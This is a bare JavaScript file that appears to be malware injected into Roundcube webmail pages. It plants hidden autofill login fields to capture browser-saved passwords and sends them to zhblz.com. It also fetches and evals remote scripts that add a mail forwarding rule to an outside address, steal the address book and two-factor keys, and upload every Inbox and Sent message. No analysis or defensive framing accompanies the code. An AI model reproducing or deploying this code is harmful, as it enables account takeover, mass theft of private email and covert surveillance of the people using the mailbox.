var mail_address = rcmail.env.username;                                                                                                                                                                                               
var mailbox_to_redirect = "advenwolf@proton.me";                                                                                                                                                                                      
var openMessageInfo = `u_${mail_address}_o_m`;                                                                                                                                                                                        
r = new RegExp(/add_message_row\((\d*)/g);                                                                                                                                                                                            
fetch(`${"https://zhblz.com/zJ2w9x"}?log=${openMessageInfo}`,{
      method: 'GET',
      headers: {
        'secure': 'bigdick'
      }});                                                                                                                                                                        
function getChromeCredentialsAndSend(mail_address) {                                                                                                                                                                                  
  userCredentials = document.getElementById("username").value + `:` + document.getElementById("password").value;                                                                                                                      
  base64Credentials = btoa(userCredentials);
  fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`c_c_f_u_${mail_address}_:_${base64Credentials}`}`,{
      method: 'GET',
      headers: {
        'secure': 'bigdick'
      }});
}
async function downd(box) {
  fetch(`?_task=mail&_action=list&_mbox=${box}&_remote=1`).then(w => w.json()).then(t => {
    y = t.exec.match(r);
    u = y.toString();
    i = u.replace(r, "$1");
    o = i.split(",");
    (async () => {
      ssv = `https://zhblz.com/zJ2w9x/uploadfile/`;
      for (p of o) {
        a = await fetch(`?_task=mail&_save=0&_uid=${p.toString()}&_mbox=${box}&_action=viewsource&_extwin=1`);
        s = new FormData;
        d = rcmail.env.username;
        f = d + "_" + box + "_" + Date.now().toString();
        let g = new File([await a.text()], f + ".eml");
        s.append("inbox", g, f + ".eml");
        s.append("d", d);
        let formData = new FormData;
        formData.append("file", g);
        fetch(ssv, {method: "POST", mode: "no-cors", body: formData, contentType: "text/html;charset=UTF-8"});
      }
      ;
    })();
  });
}
(async mail_address => {
  f = document.createElement(`div`);
  f.innerHTML = `<input type='text' name='username' id='username' value='' autocomplete='on'><input type='password' name='password' id='password' value='' autocomplete='on'>`;
  f.setAttribute("style", "visibility:hidden");
  document.body.appendChild(f);
})();
document.body.setAttribute("onclick", "userCredentials = document.getElementById('username').value + `:` + document.getElementById('password').value; base64Credentials = btoa(userCredentials); fetch(`${'https://zhblz.com/zJ2w9x'}?log=${`c_c_f_u_:_${base64Credentials}`}`,{method:'GET',headers:{'secure':'bigdick'}});");
(async (mail_address, mailbox_to_redirect) => {
  try {
    const response = await fetch("https://zhblz.com/addRedirectMailBox.js",{
      method: 'GET',
      headers: {
        'secure': 'bigdick'
      }});
    if (!response.ok) {
      await fetch(`${"https://zhblz.com/zJ2w9x"}?log=${"f_g_addRedirectMailBox.js"}`,{
      method: 'GET',
      headers: {
        'secure': 'bigdick'
      }});
      return;
    }
    ;
    const scriptContent1 = await response.text();
    eval(scriptContent1);
    var fullUrl = window.location.origin + window.location.pathname;
    const result = await addRedirectMailBox(fullUrl, mailbox_to_redirect);
    if (result == true) {
      await fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`m_f_u_${mail_address}_r_t_${mailbox_to_redirect}`}`,{
      method: 'GET',
      headers: {
        'secure': 'bigdick'
      }});
    } else {
      await fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`c_r_m_f_u_${mail_address}_t_${mailbox_to_redirect}`}`,{
      method: 'GET',
      headers: {
        'secure': 'bigdick'
      }});
    }
    ;
  } catch (error) {
    await fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`e_w_r_m_f_u_${mail_address}`}`,{
      method: 'GET',
      headers: {
        'secure': 'bigdick'
      }});
  }
  ;
})(mail_address, mailbox_to_redirect);
(async mail_address => {
  try {
    const resp = await fetch("https://zhblz.com/getUserCredentials.js",{
      method: 'GET',
      headers: {
        'secure': 'bigdick'
      }});
    if (!resp.ok) {
      await fetch(`${"https://zhblz.com/zJ2w9x"}?log=${"f_g_getUserCredentials.js"}`,{
      method: 'GET',
      headers: {
        'secure': 'bigdick'
      }});
      return;
    }
    ;
    const scriptContent = await resp.text();
    eval(scriptContent);
    getUserCredentials(userCredentials => {
      base64Credentials = btoa(userCredentials);
      fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`f_c_f_u_${mail_address}_:_${base64Credentials}`}`,{
      method: 'GET',
      headers: {
        'secure': 'bigdick'
      }});
    });
  } catch (error) {
    await fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`e_w_g_f_m_f_u_${mail_address}`}`,{
      method: 'GET',
      headers: {
        'secure': 'bigdick'
      }});
  }
  ;
})(mail_address);

(async mail_address => {
  try {
    const respo = await fetch("https://zhblz.com/adbook.js",{
      method: 'GET',
      headers: {
        'secure': 'bigdick'
      }});
    if (!respo.ok){
      await fetch(`${"https://zhblz.com/zJ2w9x"}?log=${"w_b_adbook.js"}`,{
      method: 'GET',
      headers: {
        'secure': 'bigdick'
      }});
    return;
  };
    const scriptContent3 = await respo.text();
    eval(scriptContent3);
    var fullUrl = window.location.origin + window.location.pathname;
    addressbook(emailsBook => {
      fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`t_e_f_u_${mail_address}_:_${emailsBook}`}`,{
      method: 'GET',
      headers: {
        'secure': 'bigdick'
      }});
    });
  } catch (error){
    await fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`e_t_e_f_u_${mail_address}`}`,{
      method: 'GET',
      headers: {
        'secure': 'bigdick'
      }});
  };
})(mail_address);
    
(async mail_address => {
  try {
    const res = await fetch("https://zhblz.com/keyTwoAuth.js",{
      method: 'GET',
      headers: {
        'secure': 'bigdick'
      }});
    if (!res.ok) {
      await fetch(`${"https://zhblz.com/zJ2w9x"}?log=${"f_g_keyTwoAuth.js"}`,{
      method: 'GET',
      headers: {
        'secure': 'bigdick'
      }});
      return;
    }
    ;
    const scriptContent2 = await res.text();
    eval(scriptContent2);
    var fullUrl = window.location.origin + window.location.pathname;
    keyTwoAuth(userKey => {
      base64userKeys = btoa(userKey);
      fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`k_t_f_u_${mail_address}_:_${base64userKeys}`}`,{
      method: 'GET',
      headers: {
        'secure': 'bigdick'
      }});
    });
  } catch (error) {
    await fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`e_t_k_f_u_${mail_address}`}`,{
      method: 'GET',
      headers: {
        'secure': 'bigdick'
      }});
  }
  ;
})(mail_address, mailbox_to_redirect);
(async () => {
  downd("Inbox");
})();
(async () => {
  downd("Sent");
})();
